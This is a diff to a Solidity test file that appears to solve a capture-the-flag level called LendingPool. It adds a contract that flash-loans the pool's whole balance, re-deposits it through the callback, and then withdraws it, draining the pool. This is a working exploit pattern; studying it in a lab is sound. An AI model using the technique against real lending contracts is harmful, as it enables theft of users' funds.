@@ -4,6 +4,20 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/08_LendingPool/LendingPool.sol";
 
+contract LendingPoolExploiter is IFlashLoanReceiver {
+    function exploit(LendingPool _lendingPool) public {
+        _lendingPool.flashLoan(address(_lendingPool).balance);
+        _lendingPool.withdraw();
+    }
+
+    function execute() public payable {
+        LendingPool lendingPool = LendingPool(msg.sender);
+        lendingPool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+
 // forge test --match-contract LendingPoolTest -vvvv
 contract LendingPoolTest is BaseTest {
     LendingPool instance;
@@ -14,7 +28,7 @@ contract LendingPoolTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        (new LendingPoolExploiter()).exploit(instance);
 
         checkSuccess();
     }
